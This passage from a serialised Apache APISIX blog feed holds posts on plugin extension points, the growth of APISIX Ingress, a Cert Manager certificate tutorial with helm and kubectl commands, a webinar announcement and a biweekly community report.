}\\nend\\n```\\n\\nIf there is no internal state to maintain, you can directly borrow the fixed template code (in the above code, outside the ellipsis) to fill in the two methods of `after_balance` and `before_retry_next_priority`.\\n\\nAfter selecting the node, we can also add additional logic in the form of a plugin. The plugin can implement the `before_proxy` method. This method will be called after the node is selected, and we can record the information of the currently selected node in this method, which will be useful in trace.\\n\\n## Extension Direction 4: Handling Response\\n\\nWe can process the responses returned from upstream in `header_filter` and `body_filter` through the `response-rewrite` plugin. The former method modifies the response header, the latter modifies the response body. Note that Apache APISIX response processing is streaming, so if the response header is not modified inside `header_filter`, the response header will be sent out first and there will be no way to modify the response body when it reaches `body_filter`.\\n\\nThis means that if you want to modify the body later, but there are body-related response headers like Content-Length in the header, you have to change those headers in the `header_filter` in advance. We provide a helper method: `core.response.clear_header_as_body_modified`, which can be called in `header_filter`.\\n\\nThe `body_filter` is also streaming and will be called multiple times. So if you want to get the full response body, you need to put together the partial response body provided by each `body_filter`. On the Apache APISIX master branch, we provide a method called `core.response.hold_body_chunk` to simplify the operation. Interested readers can take a look at the code.\\n\\n## Extension Direction 5: Reporting Logs and Monitoring Parameters\\n\\nAfter the request is finished, we can also do some cleanup work with the `log` method. This type of work can be divided into two categories:\\n\\n1. Record metrics, such as the `prometheus` plugin.\\n2. Record the access log, and then report it regularly, such as the `http-logger` plugin.\\n\\nIf you are interested, you can take a look at how the `log` method of these two plugins is implemented:\\n\\n- [`prometheus` plugin documentation](https://apisix.apache.org/docs/apisix/plugins/prometheus/)\\n- [`http-logger` plugin documentation](https://apisix.apache.org/docs/apisix/plugins/http-logger/)"},{"id":"2021/10/26/apisix-ingress","metadata":{"permalink":"/blog/2021/10/26/apisix-ingress","source":"@site/blog/2021/10/26/APISIX-Ingress.md","title":"How APISIX Ingress grown from 0 to 1","description":"This article describes the growth of APISIX Ingress and the details of the enhancements and community help that APISIX Ingress has received since joining the community.","date":"2021-10-26T00:00:00.000Z","formattedDate":"October 26, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":9.135,"truncated":true,"authors":[{"name":"Wei Jin","url":"https://github.com/gxthrj","imageURL":"https://avatars.githubusercontent.com/u/4413028?v=4"}],"prevItem":{"title":"Apache APISIX Extensions Guide","permalink":"/blog/2021/10/29/extension-guide"},"nextItem":{"title":"APISIX Ingress Controller manages certificates with Cert Manager","permalink":"/blog/2021/10/22/cert-manager-in-ingress"}},"content":"> This article describes the growth of APISIX Ingress and the details of the enhancements and community help that APISIX Ingress has received since joining the community.\\n\\n\x3c!--truncate--\x3e\\n\\n## Concepts\\n\\n### What is APISIX Ingress\\n\\nIn the K8s ecosystem, Ingress is a resource that represents the entry point for K8s traffic. To make it effective, an Ingress Controller is needed to listen to the Ingress resources in K8s, and to resolve the corresponding rules and actually carry the traffic.\\n\\nAPISIX Ingress is based on the Apache APISIX Ingress Controller implementation, which extends Kubernetes and also supports the native resource definition of Ingress resource.\\n\\n![APISIX Ingress Architechture](https://static.apiseven.com/202108/1635304156040-50b7a2ae-ed0c-42ac-8517-edd0715e0082.png)\\n\\nAs you can see in the figure above, APISIX Ingress is deployed in a Kubernetes cluster and proxies requests from a Kubernetes external cluster. These requests are then reverse proxied to the Kubernetes cluster Service, which also supports pushing services directly to the Service Pod.\\n\\n### What is Apache APISIX\\n\\nWe mentioned earlier that APISIX Ingress uses Apache APISIX as the actual data plane to carry business traffic, so what is Apache APISIX?\\n\\nApache APISIX is the top open source project of the Apache Foundation and the most active open source gateway project, and is currently certified as a trusted open source project by the China Academy of Information and Communications Technology. As a dynamic, real-time, high-performance open source API gateway, Apache APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, and more.\\n\\n![Apache APISIX Architechture](https://static.apiseven.com/202108/1635304156053-68751f2e-40e7-4932-99a4-5b9cc8f60628.png)\\n\\nAs you can see from the figure above, Apache APISIX is divided into two parts, data plane on the left side is used to handle the reverse proxy of traffic, and control plane on the right side is responsible for the distribution of configuration.\\n\\nThe Apache APISIX Ingress Controller uses declarative configuration, and after internal processing, the data is finally synchronized to etcd and transferred to Apache APISIX through the Admin API on the control plane to achieve configuration synchronization of the Apache APISIX cluster.\\n\\nMore information about Apache APISIX Ingress Controller features can be found [here](https://github.com/apache/apisix-ingress-controller).\\n\\n## Growth of APISIX Ingress\\n\\nMost of the previous sessions have mentioned a lot about the usage scenarios or comparative advantages of Apache APISIX Ingress. This time, let\'s take a different perspective and analyze the birth and development of Apache APISIX Ingress.\\n\\n### Joining in the Apache Community\\n\\nI provided the first lines of code for the APISIX Ingress Controller project in 2019 and the project was officially added to the Apache community in December 2020. In terms of product updates, we released the first GA version in June this year, as well as 1.3 this past October, and expect to release 1.4 in November this year to keep the project up to date.\\n\\n![Contributors Growth](https://static.apiseven.com/202108/1635304156111-d0b82a61-b304-42ce-8d3a-2b959d3cb271.png)\\n\\nThe graph above shows the contributor growth curve for Apache APISIX Ingress Controller. Combined with the timeline, we can see that the number of contributors has been increasing at a high and steady rate since we joined the Apache community in December 2020. This reflects that Apache APISIX Ingress is gaining more and more attention from partners and is gradually being used in enterprise production environments.\\n\\n### Growing in the Apache Community\\n\\nStarting with a personal project or a project incubated within a company and joining the community, the change of environment before and after inevitably leads to a change in the way the project works. By joining the community, Apache APISIX Ingress has received more support and assistance in terms of functionality and project integrity.\\n\\n#### Start asynchronous discussions\\n\\nAfter becoming an Apache Software Foundation project, the Apache APISIX Ingress Controller project became more open. For example, every feature added or modified to the product has to be discussed publicly, usually through a mailing list and a GitHub Issue.\\n\\n![Mail List](https://static.apiseven.com/202108/1635304156102-8877f3da-a43d-4b94-9a84-a95743546112.png)\\n![GitHub Issue](https://static.apiseven.com/202108/1635304156096-c0eeb189-54f8-4ebe-b019-f41001869186.png)\\n\\nAt present, the two discussions are initiated at the same time, so that as many people as possible can judge the reasonableness of the features from their own use scenarios and use perspectives. This is no longer a personal project, but a community project, a collaborative effort involving multiple people.\\n\\nAt the same time, the asynchronous discussion of the mailing list and GitHub Issue allowed for a more comprehensive collection of feedback from the community (both questions and answers), and facilitated the search and organization of subsequent questions on a public basis.\\n\\n#### Arrange Bi-weekly Meetings\\n\\nIn terms of interaction, Apache APISIX Ingress has taken the experience of some other communities and opened up a regular bi-weekly community meeting event.\\n\\nThis is a new channel that we hope to make the project transparent while also providing a more life-like channel for community members to discuss issues together.\\n\\nThrough this bi-weekly meeting, we will give you a detailed overview of what has happened in the last two weeks, what new issues have been raised and what PRs are waiting to be merged. Of course, we will also discuss any issues or suggestions for the current project.\\n\\nWe hope this will not only be an immediate discussion, but also an interaction to share and exchange observations from multiple perspectives.\\n\\nFor details on the bi-weekly meetings [click here](https://github.com/apache/apisix-ingress-controller/issues/614), you can also view the [replay of previous meetings](https://space.bilibili.com/551921247).\\n\\n#### Become More Disciplined with Project Details\\n\\nAnother big change since entering the Apache community is that project planning has become more standardized, whether it\'s code, testing, or version releases.\\n\\nAt the code level, the community is currently using the [Golang Code Specification](https://github.com/uber-go/guide), with some automated checks via Action CI.\\n\\nIn order to ensure that the project features can be merged quickly and no new bugs are introduced, we also have requirements on the test specification. For example, during the feature development process, unit tests or e2e tests must be included. e2e tests integrate gruntwork-io/terratest and kubernetes-sigs/kind to build Kubernetes test environment.\\n\\nThe test framework is Ginkgo, which is widely accepted by the community. The perfect test cases greatly ensure the stability of the project and reduce the maintenance cost of the project.\\n\\nIn terms of release, we are also strictly following the Apache community release specification. Since APISIX Ingress Controller is also an extension of Kubernetes, the iterations involving CRD also follow the Kubernetes release rules.\\n\\n## Benefits of Joining the Apache Community\\n\\nIn addition to the above mentioned specifications on the project system, we have also received a lot of \\"technical feedbacks\\" from our partners during the process of going to the community.\\n\\n### Features Improvements\\n\\nMost of these contributions come from community members using APISIX Ingress to solve problems or refine scenarios, such as\\n\\n- Admission Hook\\n- Ingress\' own Prometheus Metrics\\n- mTLs\\n- Improvements to the canary release function\\n- Additional product documentation\\n\\nMore features [click here to view](https://github.com/apache/apisix-ingress-controller/#readme).\\n\\nAlso with feedback from the community, we have supported [multi-platform integration features](https://github.com/apache/apisix-ingress-controller/blob/master/install.md#installation) in response to popular demand.\\n\\n![multi-platform integration](https://static.apiseven.com/202108/1635304156088-035cb0b0-8138-4e93-af5c-8e6ee8371f81.png)\\n\\n### Enriched library of usage scenarios\\n\\nWhile the community was enriched with features, it was also enriched with scenarios on the use of Apache APISIX Ingress.\\n\\n#### Scenario 1: Deploying Apache APISIX Ingress inside a Kubernetes cluster\\n\\nOne of the most typical ways is to deploy within a Kubernetes cluster, and the following diagram illustrates a typical usage scenario.\\n\\n![Deploying Apache APISIX Ingress inside a Kubernetes cluster](https://static.apiseven.com/202108/1635304156077-ced688eb-9dbf-4895-b7a2-acb2f4a288b2.png)\\n\\nAfter the client passes through the external LB, it is processed by Apache APISIX, which acts as a gateway and a reverse proxy and can also be deployed inside and outside the Kubernetes cluster.\\n\\nThe above deployment scenario is to integrate APISIX Ingress Controller inside Kubernetes and synchronize the declarative configuration of Kubernetes to Apache APISIX through APISIX Ingress Controller. cluster data plane to directly proxy the subsequent Upstream business services.\\n\\n#### Scenario 2: Deploying Apache APISIX Ingress Across Clusters\\n\\nSpeech.ai, a company based in Suzhou, have provided us with a cross-cluster usage scenario, and the general flow is shown below.\\n![Deploying Apache APISIX Ingress Across Clusters](https://static.apiseven.com/202108/1635304156072-ae9a3943-e686-4629-a5b7-0b5c38301139.png)\\n\\nThere are two clusters in the above architecture, the formal cloud host cluster and the physical machine cluster. Apache APISIX Ingress Controller is deployed within each cluster, interacting with the Kubernetes API server while synchronizing the configuration to the Apache APISIX Admin API. APISIX clusters.\\n\\nIn cross-cluster scenarios, access between clusters is mainly through Apache APISIX. Usually, the access between clusters is divided into private line and public network. With the health check function of Apache APISIX, the traffic can be automatically switched to other normal channels when the private line or public network transmission fails, which ensures the stability and high availability of business.\\n\\n#### Scenario 3: Manage Mutiple Kubernetes Clusters with one Apache APISIX Cluster\\n\\n![Manage Mutiple Kubernetes Clusters with one Apache APISIX Cluster](https://static.apiseven.com/202108/1635304156063-c7d879c6-8dfb-4ead-a88d-b5bdc9e453d6.png)\\n\\nThis usage scenario deploys the APISIX Ingress Controller inside a Kubernetes cluster, unlike Scenario 1 where there are multiple Kubernetes clusters. However, the corresponding Apache APISIX is actually deployed outside of all the Kubernetes clusters, and the configuration of each cluster is then synchronized to the overall Apache APISIX cluster via the Apache APISIX Ingress Controller.\\n\\nThe advantage of this is that you can fully control each Kubernetes cluster through a set of SLB Cluster, which can satisfy some enterprise architecture scenarios of multiple clusters or cross-room usage and reduce the number of forwarding on business traffic.\\n\\n### Conclusion\\n\\nThanks to the above harvest, Apache APISIX Ingress has gained more and more attention, and more and more enterprises have started to apply APISIX Ingress Controller to their own products, such as China Mobile, Youzan, Guanwei Intelligence, and many other enterprises. We expect more enterprises to choose Apache APISIX Ingress in the future.\\n\\n## Future Plan\\n\\nApache APISIX Ingress has also received some suggestions from many community partners in the process of continuous iteration, such as some feature planning for future products.\\n\\n### Support Kubernetes gateway API\\n\\nThe Kubernetes community has given a gateway API implementation standard to unify the design of Ingress. Once this standard is implemented, subsequent users can use the same configuration in different Ingress when using APISIX Ingress, perfectly adapting to multiple deployments.\\n\\n### Support Ingress Controller Monolithic Architecture\\n\\nThere are some voices in the community who believe that etcd, on which Apache APISIX relies, is actually a stateful service, and once stateful services are involved, additional attention needs to be paid to storage and migration related work.\\n\\nWe hope to make Apache APISIX seamlessly scalable in a containerized cloud-native scenario, so we will follow up with deployment planning for the Ingress Controller monolithic architecture. In this scenario, Apache APISIX can be deployed separately from etcd, and declarative configurations can be listened to by the Apache APISIX Ingress Controller and synchronized to Apache APISIX.\\n\\nMore future plans and feature-related content [click here](https://github.com/apache/apisix-ingress-controller/milestones).\\n\\nThe development of the community is never-ending, and we appreciate your support of Apache APISIX Ingress Controller along the way. We hope that you will actively participate and give us feedback on any issues regarding the Apache APISIX Ingress Controller project to make the product even better."},{"id":"APISIX Ingress Controller manages certificates with Cert Manager","metadata":{"permalink":"/blog/2021/10/22/cert-manager-in-ingress","source":"@site/blog/2021/10/22/cert-manager-in-ingress.md","title":"APISIX Ingress Controller manages certificates with Cert Manager","description":"This article shows how to create a certificate and pair it with Apache APISIX Ingress Controller via the Cert Manager.","date":"2021-10-22T00:00:00.000Z","formattedDate":"October 22, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.82,"truncated":true,"authors":[{"name":"Chao Zhang","url":"https://github.com/tokers","imageURL":"https://avatars.githubusercontent.com/u/10428333?v=4"}],"prevItem":{"title":"How APISIX Ingress grown from 0 to 1","permalink":"/blog/2021/10/26/apisix-ingress"},"nextItem":{"title":"Webinar | Apache APISIX \xd7 Apache SkyWalking Online Meetup","permalink":"/blog/2021/10/18/meetup"}},"content":"> This article shows how to create a certificate and pair it with Apache APISIX Ingress Controller via the Cert Manager.\\n\\n\x3c!--truncate--\x3e\\n\\n[Apache APISIX Ingress Controller](https://github.com/apache/apisix-ingress-controller)  is a [Kubernetes Ingress Controller](https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/) Open Source Tool that uses [Apache APISIX](http://apisix.apache.org/) as a data surface and has been updated to [v1.3](https://github.com/apache/apisix-ingress-controller/blob/master/CHANGELOG.md#130) with features such as certificate management, load balancing, Canary Publishing, and more.\\n\\nFor a long time, certificate management is not a simple thing although Apache APISIX Ingress Controller supports extracting certificates and private keys from Kubernetes Secrets Resources and converting them into Apache APISIX recognizable SSL objects, but this is only a part of the whole certificate management chain, certificate issuance, rotation, revocation logic still need to be implemented by administrators, especially when the number of certificates is relatively large, the workload is often not small, so it takes up a lot of the administrator\u2019s time.\\n\\n[Cert Manager](https://cert-manager.io/docs/) is a piece of software dedicated to simplifying certificate management on the Kubernetes platform and supports docking many different certificate sources, such as [Let\u2019s Encrypt](https://letsencrypt.org/) and [HashiCorp Vault](https://www.vaultproject.io/).\\n\\nIf you\u2019re having trouble with certificate management when using Apache APISIX Ingress Controller, using the Cert Manager is a good option, and this article shows how to create a certificate and pair it with Apache APISIX Ingress Controller via the Cert Manager.\\n\\n## Step 1: Environmental Preparation\\n\\nIf you want to follow the instructions in this article, make sure the following environments and tools are in place:\\n\\n1. To prepare a usable Kubernetes cluster, in the development environment, you can use [Kind](https://kind.sigs.k8s.io/) and [Minikube](https://kubernetes.io/docs/tutorials/hello-minikube/)\\n3. Install [kubectl](https://kubernetes.io/docs/tutorials/hello-minikube/)\\n4. Install [Helm v3](https://helm.sh/)\\n\\n> Note that all of the following operations will be performed in the ingress-apisix namespace, so you need to create the namespace first: `kubectl create namespace ingress-apisix`\\n\\n## Step 2\uff1aInstall Apache APISIX Ingress Controller\\n\\nYou can install Apache APISIX Ingress Controller via Helm, including Apache APISIX and etcd clusters for data planes.\\n\\n``` shell\\nhelm repo add apisix https://charts.apiseven.com\\nhelm repo update\\nhelm install apisix apisix/apisix --set gateway.tls.enabled=true --set ingress-controller.enabled=true --namespace ingress-apisix\\n```\\n\\nClick to view the [installation details](https://github.com/apache/apisix-helm-chart/blob/master/charts/apisix/README.md).\\n\\n## Step 3\uff1aInstall Cert Manager\\n\\nTo Install Cert Manager from Helm, click to view the [installation details](https://cert-manager.io/docs/installation/).\\n\\n```shell\\nhelm install cert-manager jetstack/cert-manager --namespace ingress-apisix  --set prometheus.enabled=false --set installCRDs=true\\n```\\n\\nPlease wait for a moment after installation to check the running status of the components and make sure that all the components are working properly. You can do this by following the command.\\n\\n```shell\\nkubectl get all -n ingress-apisix\\n```\\n\\nThe result is as follows, indicating that all components are working properly.\\n\\n```shell\\nNAME                                             READY   STATUS        RESTARTS   AGE\\npod/apisix-5d99956d88-j68sj                      1/1     Running       0          63s\\npod/apisix-69459554d4-btnwn                      0/1     Terminating   0          57m\\npod/apisix-etcd-0                                1/1     Running       0          57m\\npod/apisix-etcd-1                                1/1     Running       0          57m\\npod/apisix-etcd-2                                0/1     Running       0          50s\\npod/apisix-ingress-controller-7b5c767cc7-j62hb   1/1     Running       0          55m\\npod/cert-manager-5ffd4f6c89-q9f7m                1/1     Running       0          45m\\npod/cert-manager-cainjector-748dc889c5-nrvkh     1/1     Running       0          45m\\npod/cert-manager-startupapicheck-kmgxf           0/1     Completed     0          45m\\npod/cert-manager-webhook-bc964d98b-mkjj7         1/1     Running       0          45m\\n\\nNAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)                      AGE\\nservice/apisix-admin                ClusterIP   10.96.16.25     <none>        9180/TCP                     57m\\nservice/apisix-etcd                 ClusterIP   10.96.232.251   <none>        2379/TCP,2380/TCP            57m\\nservice/apisix-etcd-headless        ClusterIP   None            <none>        2379/TCP,2380/TCP            57m\\nservice/apisix-gateway              NodePort    10.96.118.75    <none>        80:32039/TCP,443:30107/TCP   57m\\nservice/apisix-ingress-controller   ClusterIP   10.96.13.76     <none>        80/TCP                       57m\\nservice/cert-manager-webhook        ClusterIP   10.96.182.188   <none>        443/TCP                      45m\\n\\nNAME                                        READY   UP-TO-DATE   AVAILABLE   AGE\\ndeployment.apps/apisix                      1/1     1            1           57m\\ndeployment.apps/apisix-ingress-controller   1/1     1            1           57m\\ndeployment.apps/cert-manager                1/1     1            1           45m\\ndeployment.apps/cert-manager-cainjector     1/1     1            1           45m\\ndeployment.apps/cert-manager-webhook        1/1     1            1           45m\\n\\nNAME                                                   DESIRED   CURRENT   READY   AGE\\nreplicaset.apps/apisix-5d99956d88                      1         1         1       63s\\nreplicaset.apps/apisix-69459554d4                      0         0         0       57m\\nreplicaset.apps/apisix-ingress-controller-74c6b5fbdd   0         0         0       57m\\nreplicaset.apps/apisix-ingress-controller-7b5c767cc7   1         1         1       55m\\nreplicaset.apps/apisix-ingress-controller-7d58db957c   0         0         0       55m\\nreplicaset.apps/cert-manager-5ffd4f6c89                1         1         1       45m\\nreplicaset.apps/cert-manager-cainjector-748dc889c5     1         1         1       45m\\nreplicaset.apps/cert-manager-webhook-bc964d98b         1         1         1       45m\\n\\nNAME                           READY   AGE\\nstatefulset.apps/apisix-etcd   2/3     57m\\n\\nNAME                                     COMPLETIONS   DURATION   AGE\\njob.batch/cert-manager-startupapicheck   1/1           6m24s      45m\\n```\\n\\n> The mechanism of the [Kubernetes Controller Manager](https://kubernetes.io/docs/reference/command-line-tools-reference/kube-controller-manager/) determines that the Pod name will be different.\\n\\n## Step 4: Apply for a Certificate and Test it\\n\\nFirst we need to configure the credential issuing object.\\n\\n```yaml\\n# issuer.yaml\\napiVersion: cert-manager.io/v1\\nkind: Issuer\\nmetadata:\\n  name: issuer\\n  namespace: ingress-apisix\\nspec:\\n  selfSigned: {}\\n```\\n\\nAnd create a self-signed certificate issuer.\\n\\n```shell\\nkubectl apply -f issuer.yaml\\n```\\n\\n> Note that self-signed authoring objects are not recommended for use in production environments! See [here](https://cert-manager.io/docs/configuration/) for more on the configuration of the certificate authority object.\\n\\n\u3002Then create a certificate for the domain name `httpbin. org`.\\n\\n```yaml\\n# httpbin-cert.yaml\\napiVersion: cert-manager.io/v1\\nkind: Certificate\\nmetadata:\\n  name: httpbin\\n  namespace: ingress-apisix\\nspec:\\n  secretName: httpbin\\n  duration: 2160h # 90d\\n  renewBefore: 360h # 15d\\n  subject:\\n    organizations:\\n      - foo\\n  commonName: httpbin.org\\n  isCA: false\\n  privateKey:\\n    algorithm: RSA\\n    encoding: PKCS1\\n    size: 2048\\n  usages:\\n    - server auth\\n  dnsNames:\\n    - \\"httpbin.org\\"\\n    - \\"*.httpbin.org\\"\\n  issuerRef:\\n    name: issuer\\n    kind: Issuer\\n    group: cert-manager.io\\n```\\n\\n```shell\\nkubectl apply -f httpbin-cert.yaml\\n```\\n\\nAt this point, it is necessary to see whether the corresponding Secrets have been created.\\n\\n```shell\\nkubectl get secrets -n ingress-apisix httpbin\\nNAME      TYPE                DATA   AGE\\nhttpbin   kubernetes.io/tls   3      2m5s\\n```\\n\\nWith the above validation, the creation of the Secrets object has been captured by Apache APISIX Ingress Controller, we try to access Apache APISIX Ingress Controller to verify the certificate is valid, first we need to create additional routing objects.\\n\\n```shell\\n# Create backend\\nkubectl run httpbin --image kennethreitz/httpbin --namespace ingress-apisix\\nkubectl expose pod httpbin -n ingress-apisix --port 80\\n```\\n\\n```yaml\\n# Define ApisixTls Objects\\napiVersion: apisix.apache.org/v1\\nkind: ApisixTls\\nmetadata:\\n  name: httpbin\\n  namespace: ingress-apisix\\nspec:\\n  hosts:\\n  - httpbin.org\\n  secret:\\n    name: httpbin\\n    namespace: ingress-apisix\\n---\\n# Define the route to access the backend\\napiVersion: apisix.apache.org/v2beta1\\nkind: ApisixRoute\\nmetadata:\\n  name: httpbin\\n  namespace: ingress-apisix\\nspec:\\n  http:\\n  - name: httpbin\\n    match:\\n      paths:\\n      - /*\\n      hosts:\\n      - httpbin.org\\n    backends:\\n    - serviceName: httpbin\\n      servicePort: 80\\n```\\n\\nNext access the service `apisix-gateway`. Note that the service is `NodePort` by default, and you can change its type as needed. If your Kubernetes cluster is hosted by the cloud vendor, consider changing it to the `LoadBalancer` type, to get an externally accessible IP.\\n\\nHere we map the service to local via port forwarding.\\n\\n```shell\\nkubectl port-forward -n ingress-apisix svc/apisix-gateway 8443:443\\n```\\n\\nThen start configuring access.\\n\\n```shell\\ncurl https://httpbin.org:8443/json --resolve \'httpbin.org:8443:127.0.0.1\' -sk\\n{\\n  \\"slideshow\\": {\\n    \\"author\\": \\"Yours Truly\\",\\n    \\"date\\": \\"date of publication\\",\\n    \\"slides\\": [\\n      {\\n        \\"title\\": \\"Wake up to WonderWidgets!\\",\\n        \\"type\\": \\"all\\"\\n      },\\n      {\\n        \\"items\\": [\\n          \\"Why <em>WonderWidgets</em> are great\\",\\n          \\"Who <em>buys</em> WonderWidgets\\"\\n        ],\\n        \\"title\\": \\"Overview\\",\\n        \\"type\\": \\"all\\"\\n      }\\n    ],\\n    \\"title\\": \\"Sample Slide Show\\"\\n  }\\n}\\n```\\n\\nAfter the above operation, you can see that the access was successful, that the certificate has been validated. Note that since the certificate is self-signed, the `-k` option needs to be added to ignore the certificate validation.\\n\\nIn addition, if you want to rotate the certificate, remove the `httpbin` as the Secret object, and Cert Manager immediately creates a new httpbin Secret object and includes the new certificate.\\n\\n## Summary\\n\\nThis article focuses on how to use the CERT Manager to create and manage certificates in Apache APISIX Ingress Controller. For more on Apache APISIX Ingress, [see this article](https://apisix.apache.org/zh/blog/2021/10/09/apisix-ingress-techblog/).\\n\\nOr take part in a biweekly [online discussion](https://github.com/apache/apisix-ingress-controller/issues/614) on the Apache APISIX Ingress Project to share current project progress, best practices, and design ideas."},{"id":"Webinar | Apache APISIX \xd7 Apache SkyWalking Online Meetup","metadata":{"permalink":"/blog/2021/10/18/meetup","source":"@site/blog/2021/10/18/meetup.md","title":"Webinar | Apache APISIX \xd7 Apache SkyWalking Online Meetup","description":"Cloud native API gateway Apache APISIX and Apache SkyWalking community bring you online sharing, covering APISIX observability and Ingress projects, E2E testing, etc.","date":"2021-10-18T00:00:00.000Z","formattedDate":"October 18, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.69,"truncated":true,"authors":[],"prevItem":{"title":"APISIX Ingress Controller manages certificates with Cert Manager","permalink":"/blog/2021/10/22/cert-manager-in-ingress"},"nextItem":{"title":"Bieekly Report (Oct 1 - Oct 14)","permalink":"/blog/2021/10/14/weekly-report-1014"}},"content":"> On October 23rd, the Apache APISIX community is joining forces with the Apache SkyWalking community to bring you an online sharing session.\\n\x3c!--truncate--\x3e\\n\\n![Apache APISIX \xd7 Apache SkyWalking Meetup](https://static.apiseven.com/202108/1634607898296-26d3dbea-da8b-41cc-a50d-b4aa37f69f5f.jpeg)\\n\\n## Sharing Topics\\n\\n### Introduction to Apache APISIX Observability\\n\\n#### Sharing Guests\\n\\nHaochao Zhuang, Apache APISIX Contributor, Apache SkyWalking Committer & PMC member.\\n\\n#### Topic Details\\n\\nApache APISIX has better observability capabilities than native Nginx, and will introduce the monitoring tools and capabilities that Apache APISIX already has. This session will introduce the monitoring tools and capabilities already available in Apache APISIX, and what enhancements have been made since the integration with Apache SkyWalking, and what new features will be added in the future. We are looking forward to seeing what sparks the Red and Blue (APISIX X SkyWalking) combination will bring.\\n\\n### End-to-end testing with Apache SkyWalking Infra E2E\\n\\n#### Sharing Guests\\n\\nHan Liu, Apache SkyWalking Committer & PMC member\\n\\n#### Topic Details\\n\\nNowadays, more and more projects are using end-to-end testing to automate functional testing, and this session focuses on SkyWalking-Infra-E2E framework and its implementation in Apache SkyWalking.\\n\\n### How Apache APISIX Ingress Controller is growing in the community\\n\\n#### Guest Speakers\\n\\nWei Jin, Apache APISIX PMC, Apache SkyWalking Committer\\n\\n#### Topic Details\\n\\n1. Introducing the Apache APISIX Ingress Controller project\\n2. New energy brought by joining the Apache community\\n3. How the Apache APISIX Ingress Controller works in the community\\n4. Welcome to the Apache APISIX community\\n\\n### License Eye - an open source software protocol tool\\n\\n#### Sharing Guests\\n\\nZhenxu Ke, Apache SkyWalking PMC member, Apache Incubator PMC member and mentor\\n\\n#### Topic Details\\n\\nThis session will take Apache SkyWalking as an example, summarize the protocol issues that may be encountered during the operation of open source projects, and introduce in detail how to use License Eye, a tool for handling open source protocols.\\n\\n## How to participate\\n\\n\ud83d\udc47\ud83d\udc47\ud83d\udc47\ud83d\udc47 Scan the code to follow the video number and book this live broadcast.\\n![Apache APISIX wechat](https://apisix.apache.org/assets/images/2021-08-21-2-e9610756c89fec849caeb66361bce002.png)\\n\\nSee you live on Saturday, October 23rd at 14:00!"},{"id":"Bieekly Report (Oct 1 - Oct 14)","metadata":{"permalink":"/blog/2021/10/14/weekly-report-1014","source":"@site/blog/2021/10/14/weekly-report-1014.md","title":"Bieekly Report (Oct 1 - Oct 14)","description":"The Apache APISIX Community Weekly Newsletter hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2021-10-14T00:00:00.000Z","formattedDate":"October 14, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.435,"truncated":true,"authors":[],"prevItem":{"title":"Webinar | Apache APISIX \xd7 Apache SkyWalking Online Meetup","permalink":"/blog/2021/10/18/meetup"},"nextItem":{"title":"New milestone for APISIX - over 300 contributors worldwide!","permalink":"/blog/2021/10/13/celebrating-300-contributors-of-apisix"}},"content":"> From 10.1 to 10.14, 27 developers have committed 67 commits to Apache APISIX. Thank you to these folks for making the Apache APISIX project better with your selfless efforts!\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community since the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements could not have been achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together\\", Apache APISIX Community Weekly Report hopes to help community members better grasp the weekly progress of the Apache APISIX community and facilitate your participation in the Apache APISIX community.\\n\\nWe\'ve also put together some issues for those new to the community!\\n\\n## Contributor statistics\\n\\n![This week\'s contributor list](https://static.apiseven.com/202108/1634183939241-a87516e5-cb52-4532-87e2-306c09155a70.png)\\n\\n![New contributors this week](https://static.apiseven.com/202108/1634183019951-bcf250cd-e5b5-443e-afc4-3cfdef0d6eab.jpg)\\n\\n## Good first issue\\n\\n### Issue #5165\\n\\n**Link**: https://github.com/apache/apisix/issues/5165\\n\\n**Problem Description**:\\n\\n- When a browser publishes across domains and then displays a CORS error, the login for the `wolf-rbac` plugin `url/apisix/plugin/wolf-rbac/login` returns `json` format, but the `header` gives a content type of `text/plain`, please change the content type to `application/json` after the plugin login.\\n\\n- The login for `wolf-rabc` `uri/apisix/plugin/wolf-rbac/login` will lose the CORS plugin with the added header.\\n\\n### Issue #5192\\n\\n**Link**: https://github.com/apache/apisix/issues/5192\\n\\n**Problem Description**: When installing APISIX dependencies, different Linux distributions will have different executions. Is it possible to merge these different executions into \\"install-dependencise.sh\\" to make it easier for users to install dependencies?\\n\\n## Feature highlights of the week\\n\\n- [Dashboard support for configuring the host field in Service to provide routing defaults](https://github.com/apache/apisix-dashboard/pull/2149) (Contributor: [bzp2010](https://github.com/bzp2010))\\n\\n- [APISIX support test profile](https://github.com/apache/apisix/pull/5171) (Contributor: [nic-chen](https://github.com/nic-chen))\\n\\n- [APISIX adds ldap-auth plugin](https://github.com/apache/apisix/pull/3894) (Contributor: [jp-gouin](https://github.com/jp-gouin))\\n\\n## Recommended blog posts for this week\\n\\n- [New milestone for the Apache APISIX community - topping 300 contributors worldwide!](https://apisix.apache.org/zh/blog/2021/10/13/celebrating-300-contributors-of-apisix).\\n\\n  The Apache APISIX community has reached a new milestone, surpassing 300 global contributors to projects related to Apache APISIX! Just 3 months after the Apache APISIX main repository reached the 200 contributor milestone! Thank you to our community contributors for their outstanding contributions in all aspects of code, documentation, operations, and more.\\n\\n- [Apache APISIX community members help openEuler release first community innovation version](https://apisix.apache.org/zh/blog/2021/10/01/openEuler)\\n\\n  Zexuan Luo and Ming Wen from the Apache APISIX community contributed to the first community innovation release of openEuler (openEuler 21.09) on September 30, which allowed OpenResty to run smoothly and efficiently on the Euler open source operating system. The stable operation of OpenResty also means that Apache APISIX can run smoothly on the openEuler system, and the underlying Apache APISIX is based on OpenResty for some development.\\n\\n- [Apache APISIX 2.10.0 is released, bringing the first LTS version!](https://apisix.apache.org/zh/blog/2021/09/29/release-apache-apisix-2.10)\\n\\n  Apache APISIX version 2.10 is officially released! \ud83c\udf89 This is the first LTS release of Apache APISIX, with support for 10+ new features and new plugins. Have a quick read about the new features in version 2.10!"},{"id":"New milestone for APISIX - over 300 contributors 